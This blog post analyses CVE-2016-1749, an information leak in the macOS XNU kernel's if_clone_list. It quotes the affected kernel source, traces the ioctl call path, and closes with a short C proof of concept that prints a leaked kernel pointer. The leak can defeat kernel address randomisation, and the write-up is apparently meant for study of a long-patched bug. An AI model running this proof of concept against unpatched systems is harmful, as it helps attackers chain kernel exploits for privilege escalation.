---
layout:    post
title:     CVE-2016-1749 macOS Kernel Information Leak
author:    wooy0ung
tags:      macos
category:  exploit
---


>[Analysis Environment]  
>virtual machine: OS X 10.11.3 EI Capitan  
>affected system: OS X before 10.11.3(patched in 10.11.4)  
>description: We can leak the kernel pointer by copying the 8 byte of the uninitialized kernel stack to the user space, while we can calculate the kernel slice by substraction the base adderess from leaked kernel pointer.  
<!-- more -->


## 0x001 Analysis

Let's check if_clone_list method in the "/bsd/net/if.c" file
```
/*
 * Provide list of interface cloners to userspace.
 */
static int
if_clone_list(int count, int *ret_total, user_addr_t dst)
{
  char outbuf[IFNAMSIZ];
  struct if_clone *ifc;
  int error = 0;

  *ret_total = if_cloners_count;
  if (dst == USER_ADDR_NULL) {
    /* Just asking how many there are. */
    return (0);
  }

  if (count < 0)
    return (EINVAL);

  count = (if_cloners_count < count) ? if_cloners_count : count;

  for (ifc = LIST_FIRST(&if_cloners); ifc != NULL && count != 0;
       ifc = LIST_NEXT(ifc, ifc_list), count--, dst += IFNAMSIZ) {
    strlcpy(outbuf, ifc->ifc_name, IFNAMSIZ);
    error = copyout(outbuf, dst, IFNAMSIZ);
    if (error)
      break;
  }

  return (error);
}
```

The value of IFNAMSIZ is 16.
![](/assets/img/xnu/2018-08-10-cve-2016-1749-macos-kernel-information-leak/0x001.png)

When the length of the ifc_name is less than the length of the outbuf, some bytes are not initialized at the end of the outbuf after being copied to out buf.

The first interface is called "bridge", so ifc_name is 6 characters, leaving 9 bytes of uninitialized bytes in outbuf.

Then it copies outbuf to dst which is user space as much as "IFNAMSIZ". Therefore, the kernel pointer will be copied to user space and leaked.

Look at this, we may find the method that wa originally called.
```
soo_ioctl -> soioctl -> ifioctllocked -> ifioctl -> ifioctl_ifclone -> if_clone_list
```

soo_ioctl itself is used by the socketops structure.
```
const struct fileops socketops = {
  DTYPE_SOCKET,
  soo_read,
  soo_write,
  soo_ioctl,
  soo_select,
  soo_close,
  soo_kqfilter,
  soo_drain
};
```

Since if_clone is called from within ifioctl_ifclone, cmd must be SIOCIFGCLONERS. So we can call it in this way. ioctl(sockfd,SIOCIFGCLONERS,&ifcr)
```
int
ifioctl(struct socket *so, u_long cmd, caddr_t data, struct proc *p)
{
  char ifname[IFNAMSIZ + 1];
  struct ifnet *ifp = NULL;
  struct ifstat *ifs = NULL;
  int error = 0;

  bzero(ifname, sizeof (ifname));

  /*
   * ioctls which don't require ifp, or ifreq ioctls
   */
  switch (cmd) {
  case OSIOCGIFCONF32:      /* struct ifconf32 */
  case SIOCGIFCONF32:     /* struct ifconf32 */
  case SIOCGIFCONF64:     /* struct ifconf64 */
  case OSIOCGIFCONF64:      /* struct ifconf64 */
    error = ifioctl_ifconf(cmd, data);
    goto done;

  case SIOCIFGCLONERS32:      /* struct if_clonereq32 */
  case SIOCIFGCLONERS64:      /* struct if_clonereq64 */
    error = ifioctl_ifclone(cmd, data);
    goto done;

  case SIOCGIFAGENTDATA32:    /* struct netagent_req32 */
  case SIOCGIFAGENTDATA64:    /* struct netagent_req64 */
    error = netagent_ioctl(cmd, data);
    goto done;
......
```

If you look at the ifioctl_ifclone method, you can see that it uses the if_clonereq structure as the if_clone_list argument.
```
static __attribute__((noinline)) int
ifioctl_ifclone(u_long cmd, caddr_t data)
{
  int error = 0;

  switch (cmd) {
  case SIOCIFGCLONERS32: {    /* struct if_clonereq32 */
    struct if_clonereq32 ifcr;
    bcopy(data, &ifcr, sizeof (ifcr));
    error = if_clone_list(ifcr.ifcr_count, &ifcr.ifcr_total,
        CAST_USER_ADDR_T(ifcr.ifcru_buffer));
    bcopy(&ifcr, data, sizeof (ifcr));
    break;
  }

  case SIOCIFGCLONERS64: {    /* struct if_clonereq64 */
    struct if_clonereq64 ifcr;
    bcopy(data, &ifcr, sizeof (ifcr));
    error = if_clone_list(ifcr.ifcr_count, &ifcr.ifcr_total,
        ifcr.ifcru_buffer);
    bcopy(&ifcr, data, sizeof (ifcr));
    break;
  }

  default:
    VERIFY(0);
    /* NOTREACHED */
  }

  return (error);
}
```


## 0x002 Finish it!

Finally, if you run the flowing source, you will see an information leak.
```
#include <net/if.h>
#include <stdio.h>
#include <sys/ioctl.h>

char buffer[IFNAMSIZ];

struct if_clonereq ifcr = {
        .ifcr_count = 1,
        .ifcr_buffer = buffer
};

int main(){
        int sockfd = socket(AF_INET,SOCK_STREAM,0);
        int err = ioctl(sockfd,SIOCIFGCLONERS,&ifcr);
        printf("0x%016llx\n",*(uint64_t *)(buffer + 8));
}
```
![](/assets/img/xnu/2018-08-10-cve-2016-1749-macos-kernel-information-leak/0x002.png)